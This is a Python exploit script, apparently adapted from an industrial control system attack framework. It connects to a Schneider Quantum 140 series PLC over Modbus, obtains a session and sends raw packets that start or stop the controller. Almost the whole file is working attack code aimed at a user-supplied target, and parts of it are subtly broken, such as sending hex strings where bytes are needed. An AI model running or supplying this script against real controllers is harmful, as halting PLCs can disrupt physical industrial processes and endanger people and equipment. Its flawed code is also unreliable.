# -*- coding: utf-8 -*-
import socket
import struct
import time
import sys
from binascii import unhexlify

get_session_payload = '013800000018005a0010337700000f57494e2d5039504b48485643495538'


class Exploit(object):
    __info__ = {
        'name': 'Schneider Quantum 140 series PLC Control',
        'authors': [
            'w3h <https://github.com/w3h>'
            'wenzhe zhu <jtrkid[at]gmail.com>',  # icsmodules
        ],
        'description': 'Use Modbus command to start/stop plc.',
        'references': [
            'https://github.com/w3h/isf/blob/master/module/exploits/Schneider/Schneider_CPU_Comoand.py'
        ],
        'devices': [
            'Schneider Quantum 140 series programmable logic controllers (PLCs)',
        ],
    }

    #target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    #port = exploits.Option(502, 'Target Port', validators=validators.integer)
    #command = exploits.Option(2, 'Command 1:start plc, 2:stop plc.', validators=validators.integer)
    #sock = None
    #session = ""
    def __init__(self, ip, port, command) -> None:
        self.target = ip  # 'Target address e.g. 192.168.1.1'
        self.port = port  # 'Target Port'
        self.command = command  # 'Command 1:start plc, 2:stop plc.'
        self.sock = None
        session = ""
    def get_session(self):
        self.sock.send(get_session_payload)
        rsp = self.sock.recv(1024)
        if rsp:
            self.session = rsp[:-1]
            return True
        else:
            return False

    def exploit(self):
        self.sock = socket.socket()
        self.sock.settimeout(3)
        self.sock.connect((self.target, self.port))
        if self.get_session():
            if self.command == 1:
                print("Start plc")
                buff = ('015300000006005a' + self.session + '40ff00')
                self.sock.send(buff)
            elif self.command == 2:
                print("Stop plc")
                buff = ('015800000006005a' + self.session + '41ff00')
                self.sock.send(buff)
            else:
                print("Command %s didn't support" % self.command)
        else:
            print("Can't get session, stop exploit.")

    def run(self):
        if self._check_alive():
            print("Target is alive")
            print("Sending packet to target")
            self.exploit()
        else:
            print("Target is not alive")


    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True



if __name__ == '__main__':
     ip      = str(sys.argv[1].strip())
     port    = int(sys.argv[2].strip())
     command = int(sys.argv[3].strip())
     scan = Exploit(ip, port, command)
     scan.run()
